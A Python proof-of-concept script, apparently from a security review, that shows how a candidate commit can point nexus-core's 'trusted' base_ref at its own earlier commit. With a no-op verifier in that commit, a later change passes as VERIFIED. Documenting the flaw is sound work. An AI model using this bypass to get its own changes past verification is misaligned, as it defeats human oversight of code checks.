"""Candidate-controlled worktree base_ref redirects the 'trusted' config source.

--require-trusted-config only checks config_source.kind == 'base-ref'; the base ref
NAME comes from the (untrusted) worktree config, so a candidate can point it at its
own earlier commit carrying a weak config.  check passes VERIFIED with
config_source.kind == base-ref and receipt-check --require-trusted-config accepts it.
"""
import json, subprocess, sys, tempfile
from pathlib import Path
sys.path.insert(0, "/home/user/nexus-core")
from product.clients.local_golden_path import check_repository, LocalCheckError
from product.clients.cli import main as cli

PY = sys.executable
def git(repo, *a):
    return subprocess.run(["git", *a], cwd=repo, check=True, capture_output=True, text=True).stdout.strip()
def cfg(base_ref, cmd):
    return (f'version = 1\nbase_ref = "{base_ref}"\nallowed_patterns = ["**"]\n'
            f'deletion_policy = "FORBID"\nverifier_command = {json.dumps(cmd)}\ntimeout_seconds = 60\n')

repo = Path(tempfile.mkdtemp()) / "r"; repo.mkdir()
git(repo, "init", "-q", "-b", "main"); git(repo, "config", "user.email", "a@b"); git(repo, "config", "user.name", "a")
(repo / ".nexus-core").mkdir()
# Owner's trusted config on main: verifier ALWAYS FAILS (stands in for a strict test suite)
(repo / ".nexus-core/config.toml").write_text(cfg("main", [PY, "-c", "import sys; sys.exit(1)"]))
(repo / "app.py").write_text("V = 0\n")
git(repo, "add", "-A"); git(repo, "commit", "-qm", "base with trusted config")

git(repo, "checkout", "-qb", "feature")
# Control: honest candidate -> trusted strict config -> FAILED_VERIFICATION
(repo / "app.py").write_text("V = 1\n"); git(repo, "commit", "-qam", "change")
r = check_repository(repo, require_trusted_config=True)
print("CONTROL honest base_ref=main:", r["status"], r["config_source"]["kind"])

# Attack: candidate commit F1 sets base_ref = "HEAD~1" and a no-op verifier; F2 any change.
(repo / ".nexus-core/config.toml").write_text(cfg("HEAD~1", [PY, "-c", "pass"]))
git(repo, "commit", "-qam", "F1 weak config naming HEAD~1")
(repo / "app.py").write_text("V = 'malicious'\n"); git(repo, "commit", "-qam", "F2 payload")
r = check_repository(repo, require_trusted_config=True)
src = r["config_source"]
print("ATTACK base_ref=HEAD~1:", r["status"], "config_source.kind=", src["kind"], "commit=", src["commit"][:12],
      "| main sha=", git(repo, "rev-parse", "main")[:12], "| F1 sha=", git(repo, "rev-parse", "HEAD~1")[:12])
rc = cli(["receipt-check", "--receipt", str(r["receipt_path"]), "--expect-status", "VERIFIED",
          "--expect-subject-head", git(repo, "rev-parse", "HEAD"), "--require-trusted-config", "--require-clean-subject"])
print("receipt-check --require-trusted-config exit:", rc)
